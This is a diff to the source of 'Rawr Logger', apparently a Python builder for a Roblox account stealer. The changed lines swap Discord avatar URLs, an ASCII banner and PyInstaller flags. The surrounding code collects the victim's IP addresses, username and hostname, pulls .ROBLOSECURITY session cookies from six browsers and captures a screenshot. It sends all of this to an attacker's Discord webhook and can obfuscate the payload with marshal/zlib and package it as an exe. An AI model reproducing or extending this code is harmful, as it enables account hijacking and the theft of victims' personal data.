@@ -33,13 +33,13 @@ ips = requests.get('https://api.ipify.org').text
 pc_username = os.getenv("UserName")
 ip = socket.gethostbyname(hostname) 
 embed = {
-            "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+            "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
             "embeds": [
                 {
                     "author": {
                         "name": "Rawr Logger",
 
-                        "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                        "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                     },
                     "description": f" @everyone You Got A Hit\n```There Public Ip Is: {ips}``` ```There Computers Ip:{ip}``` ```There Pc Username Is: {pc_username}``````There Pc Host Name Is: {hostname}```",
                 }
@@ -52,11 +52,11 @@ def edge():
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                     },
                     "description": f" ```Roblox Cookie Is:{cookie}```",                       
                     "footer": {
@@ -75,11 +75,11 @@ def chromes():
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                     },
                     "description": f"```Roblox Cookie Is:{cookie}```",                       
                 }
@@ -95,11 +95,11 @@ def firefoxs():
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                     },
                     "description": f"```Roblox Cookie Is:{cookie}```",                      
                 }
@@ -115,11 +115,11 @@ def braves():
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                     },
                     "description": f"```Roblox Cookie Is:{cookie}```",                       
                 }
@@ -135,11 +135,11 @@ def operas():
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                     },
                     "description": f"```Roblox Cookie Is:{cookie}```",                      
                 }
@@ -155,11 +155,11 @@ def vivaldis():
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                     },
                     "description": f"```Roblox Cookie Is:{cookie}``````",                       
                 }
@@ -180,13 +180,36 @@ with open('image.png', 'rb') as f:
 os.remove('image.png')
 
 Write.Print(Center.XCenter("""
-    ____                         __                               
-   / __ \____ __      _______   / /   ____  ____ _____ ____  _____
-  / /_/ / __ `/ | /| / / ___/  / /   / __ \/ __ `/ __ `/ _ \/ ___/
- / _, _/ /_/ /| |/ |/ / /     / /___/ /_/ / /_/ / /_/ /  __/ /    
-/_/ |_|\__,_/ |__/|__/_/     /_____/\____/\__, /\__, /\___/_/     
-                                         /____//____/                             
-             Made By Jose#0001,TheSoap1#9870                                          
+                                          
+                                ▒▒▓▓                              
+                                ▒▒▓▓                              
+                              ░░██░░                              
+                            ░░██████░░                            
+                          ▒▒████████░░                            
+                        ▒▒██████████░░                            
+                      ████████████████▓▓                          
+                    ████████████▓▓████▒▒                          
+                  ████████████▓▓▒▒██████▓▓                        
+                ████████████▓▓▒▒▒▒██████▒▒                        
+                ████████████▓▓▒▒▓▓████████▓▓                      
+              ▒▒████████████▒▒▓▓██████████▓▓                      
+              ██████████▓▓▒▒▒▒▓▓████████████▓▓                    
+            ░░██████████▓▓▒▒▒▒▓▓████████████▓▓                    
+            ████████████▒▒▒▒▒▒████████████████                    
+            ██████████▓▓▒▒▒▒▒▒▓▓████████████████                  
+            ██████████▓▓▒▒▒▒▒▒▓▓████████████████▒▒                
+            ██████████▒▒▒▒▒▒▒▒▒▒▒▒████████████████                
+            ████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒████████████████                
+            ████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████████████                
+            ████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓████████████                
+            ████████▓▓▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒████████████                
+              ██████▓▓▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒▓▓████████                  
+              ████████▓▓▒▒░░░░░░▒▒▒▒▒▒▓▓████████                  
+                ██████▓▓▒▒░░░░░░▒▒▒▒▒▒▓▓████████                  
+                ████████▓▓▒▒░░▒▒▒▒▒▒▓▓████████                    
+                  ████████▓▓▒▒▒▒▒▒▓▓████████                      
+                      ████████████████▓▓                          
+                  Made By Jose#0001,TheSoap1#9870                                          
                                          
 """), Colors.green_to_yellow, interval=0)
 webhook = Write.Input("\nEnter webhook URL:", Colors.green_to_yellow, interval=0.01)
@@ -216,13 +239,13 @@ ips = requests.get('https://api.ipify.org').text
 pc_username = os.getenv("UserName")
 ip = socket.gethostbyname(hostname) 
 embed = {
-            "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+            "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
             "embeds": [
                 {
                     "author": {
                         "name": "Rawr Logger",
 
-                        "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                        "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                     },
 "description": f" @everyone You Got A Hit```There Public Ip Is: {ips}``` ```There Computers Ip:{ip}``` ```There Pc Username Is: {pc_username}``````There Pc Host Name Is: {hostname}```",
                 }
@@ -235,11 +258,11 @@ def edge():
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                     },
                     "description": f" ```Roblox Cookie Is:{cookie}```",                       
                     "footer": {
@@ -258,11 +281,11 @@ def chromes():
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                     },
                     "description": f"```Roblox Cookie Is:{cookie}```",                       
                 }
@@ -278,11 +301,11 @@ def firefoxs():
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                     },
                     "description": f"```Roblox Cookie Is:{cookie}```",                      
                 }
@@ -298,11 +321,11 @@ def braves():
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                     },
                     "description": f"```Roblox Cookie Is:{cookie}```",                       
                 }
@@ -318,11 +341,11 @@ def operas():
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                     },
                     "description": f"```Roblox Cookie Is:{cookie}```",                      
                 }
@@ -338,11 +361,11 @@ def vivaldis():
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                     },
                     "description": f"```Roblox Cookie Is:{cookie}``````",                       
                 }
@@ -376,8 +399,7 @@ if prot == 'y':
         f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")
     compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
     if compile == "y":
-      os.system(f'pyinstaller --onefile --noconsole --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab"  --hidden-from pystyle import="*" --hidden-import="browser_cookie3" {name}.py')
-      shutil.rmtree('build')
+      os.system(f'pyinstaller --onefile --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="pystyle"  --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab" --hidden-import="browser_cookie3" {name}.py')
       os.remove(f'{name}.spec')
       Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
       time.sleep(2)
